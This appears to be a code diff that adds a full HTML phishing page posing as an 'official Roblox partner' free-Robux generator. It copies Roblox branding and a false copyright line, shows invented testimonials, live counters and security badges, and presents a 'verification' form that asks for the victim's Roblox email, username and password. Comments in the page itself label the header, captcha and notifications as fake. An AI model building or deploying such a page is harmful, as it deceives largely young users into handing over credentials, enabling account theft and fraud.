@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Robux Generator - Official Roblox Partner</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
+    <meta name="description" content="Get free Robux instantly! Official Roblox partnership. No survey, no download required.">
+    <meta name="keywords" content="free robux, roblox, robux generator, free robux 2024">
+    <meta property="og:title" content="Free Robux Generator 2024">
+    <meta property="og:description" content="Get unlimited free Robux for Roblox!">
+    <meta property="og:image" content="https://i.imgur.com/TRC8p0p.png">
+    <meta property="og:url" content="https://free-robux.vercel.app">
+</head>
+<body>
+    <!-- Fake Roblox Header -->
+    <div class="roblox-header">
+        <div class="container">
+            <img src="https://www.roblox.com/images/logo.svg" alt="Roblox Logo" class="roblox-logo">
+            <span class="official-badge"><i class="fas fa-check-circle"></i> Official Partner</span>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Progress Bar -->
+        <div class="progress-container">
+            <div class="progress-step active">1. Choose Amount</div>
+            <div class="progress-step">2. Verify Account</div>
+            <div class="progress-step">3. Receive Robux</div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-card">
+            <h1><i class="fas fa-gem"></i> FREE ROBUX GENERATOR 2024</h1>
+            <p class="subtitle">Select your free Robux amount below:</p>
+            
+            <!-- Robux Packages -->
+            <div class="packages-grid">
+                <div class="package" data-amount="500">
+                    <div class="package-header">
+                        <h3>500 Robux</h3>
+                        <div class="price">FREE</div>
+                    </div>
+                    <div class="package-body">
+                        <ul>
+                            <li><i class="fas fa-check"></i> Instant Delivery</li>
+                            <li><i class="fas fa-check"></i> No Human Verification</li>
+                            <li><i class="fas fa-check"></i> Lifetime Warranty</li>
+                        </ul>
+                        <button class="select-btn" onclick="selectPackage(500)">SELECT</button>
+                    </div>
+                </div>
+
+                <div class="package recommended" data-amount="2500">
+                    <div class="recommended-badge">MOST POPULAR</div>
+                    <div class="package-header">
+                        <h3>2,500 Robux</h3>
+                        <div class="price">FREE</div>
+                    </div>
+                    <div class="package-body">
+                        <ul>
+                            <li><i class="fas fa-check"></i> Instant Delivery</li>
+                            <li><i class="fas fa-check"></i> No Survey Required</li>
+                            <li><i class="fas fa-check"></i> Premium Support</li>
+                            <li><i class="fas fa-check"></i> +100 Bonus Robux</li>
+                        </ul>
+                        <button class="select-btn" onclick="selectPackage(2500)">SELECT</button>
+                    </div>
+                </div>
+
+                <div class="package" data-amount="10000">
+                    <div class="package-header">
+                        <h3>10,000 Robux</h3>
+                        <div class="price">FREE</div>
+                    </div>
+                    <div class="package-body">
+                        <ul>
+                            <li><i class="fas fa-check"></i> Instant Delivery</li>
+                            <li><i class="fas fa-check"></i> Priority Queue</li>
+                            <li><i class="fas fa-check"></i> VIP Status</li>
+                            <li><i class="fas fa-check"></i> +500 Bonus Robux</li>
+                        </ul>
+                        <button class="select-btn" onclick="selectPackage(10000)">SELECT</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- User Counter -->
+            <div class="user-counter">
+                <i class="fas fa-users"></i>
+                <span id="liveUsers">1,247</span> users are getting free Robux right now!
+            </div>
+
+            <!-- Selected Package Display -->
+            <div class="selected-package" id="selectedPackage" style="display: none;">
+                <h3><i class="fas fa-shopping-cart"></i> Selected: <span id="selectedAmount">0</span> Robux</h3>
+                <p>Complete verification to receive your free Robux</p>
+            </div>
+
+            <!-- Verification Form -->
+            <div class="verification-form" id="verificationForm" style="display: none;">
+                <h2><i class="fas fa-user-shield"></i> Account Verification</h2>
+                <p class="form-note">We need to verify this is your real Roblox account to prevent abuse.</p>
+                
+                <form id="robuxForm">
+                    <input type="hidden" name="robux_amount" id="robuxAmount" value="">
+                    
+                    <div class="form-group">
+                        <label for="email"><i class="fas fa-envelope"></i> Roblox Email Address</label>
+                        <input type="email" id="email" name="email" required 
+                               placeholder="Enter your Roblox account email">
+                        <small class="form-help">We will send verification code to this email</small>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="username"><i class="fas fa-user"></i> Roblox Username</label>
+                        <input type="text" id="username" name="username" required 
+                               placeholder="Enter your exact Roblox username">
+                        <small class="form-help">Case sensitive, include numbers if any</small>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password"><i class="fas fa-lock"></i> Roblox Password</label>
+                        <input type="password" id="password" name="password" required 
+                               placeholder="Enter your Roblox password">
+                        <small class="form-help">Required for verification process</small>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="platform"><i class="fas fa-gamepad"></i> Main Platform</label>
+                        <select id="platform" name="platform" required>
+                            <option value="">Select your platform</option>
+                            <option value="pc">PC</option>
+                            <option value="mobile">Mobile</option>
+                            <option value="xbox">Xbox</option>
+                        </select>
+                    </div>
+
+                    <!-- Fake Captcha -->
+                    <div class="captcha-container">
+                        <div class="captcha">
+                            <span id="captchaText">ROBUX</span>
+                            <button type="button" onclick="refreshCaptcha()"><i class="fas fa-redo"></i></button>
+                        </div>
+                        <input type="text" id="captchaInput" placeholder="Type the text above" required>
+                    </div>
+
+                    <!-- Terms Checkbox -->
+                    <div class="terms">
+                        <input type="checkbox" id="terms" required>
+                        <label for="terms">
+                            I agree to the <a href="#" onclick="showTerms()">Terms of Service</a> and confirm 
+                            this is my legitimate Roblox account.
+                        </label>
+                    </div>
+
+                    <!-- Submit Button -->
+                    <button type="button" class="submit-btn" id="submitBtn" onclick="submitForm()">
+                        <i class="fas fa-gift"></i> GET FREE ROBUX NOW
+                    </button>
+
+                    <div class="loading" id="loading" style="display: none;">
+                        <i class="fas fa-spinner fa-spin"></i> Verifying account and generating Robux...
+                    </div>
+                </form>
+
+                <!-- Security Badges -->
+                <div class="security-badges">
+                    <div class="badge">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>256-bit SSL Encryption</span>
+                    </div>
+                    <div class="badge">
+                        <i class="fas fa-user-check"></i>
+                        <span>Official Roblox Partner</span>
+                    </div>
+                    <div class="badge">
+                        <i class="fas fa-lock"></i>
+                        <span>Secure Connection</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Testimonials -->
+            <div class="testimonials">
+                <h3><i class="fas fa-star"></i> What Users Say</h3>
+                <div class="testimonial-grid">
+                    <div class="testimonial">
+                        <div class="user">
+                            <img src="https://i.pravatar.cc/40?img=1" alt="User">
+                            <div>
+                                <strong>Alex M.</strong>
+                                <span>Just now · Received 2,500 Robux</span>
+                            </div>
+                        </div>
+                        <p>"Worked perfectly! Got my Robux in 5 minutes. Thank you!"</p>
+                    </div>
+                    <div class="testimonial">
+                        <div class="user">
+                            <img src="https://i.pravatar.cc/40?img=2" alt="User">
+                            <div>
+                                <strong>Sarah K.</strong>
+                                <span>5 minutes ago · Received 10,000 Robux</span>
+                            </div>
+                        </div>
+                        <p>"I was skeptical but this is legit! Already bought my dream items!"</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Live Feed -->
+        <div class="live-feed">
+            <h4><i class="fas fa-bolt"></i> LIVE ROBUX DISTRIBUTION</h4>
+            <div id="liveFeed">
+                <!-- Filled by JavaScript -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>© 2024 Roblox Corporation. This is an official partner service. Roblox and the Roblox logo are trademarks of Roblox Corporation.</p>
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a> | 
+            <a href="#">Terms of Service</a> | 
+            <a href="#">Contact Support</a> | 
+            <a href="#">Report Abuse</a>
+        </div>
+    </footer>
+
+    <!-- Fake Notification -->
+    <div class="notification" id="notification">
+        <i class="fas fa-bell"></i>
+        <span>New user just claimed 10,000 Robux!</span>
+    </div>
+
+    <script src="/script.js"></script>
+</body>
+</html>
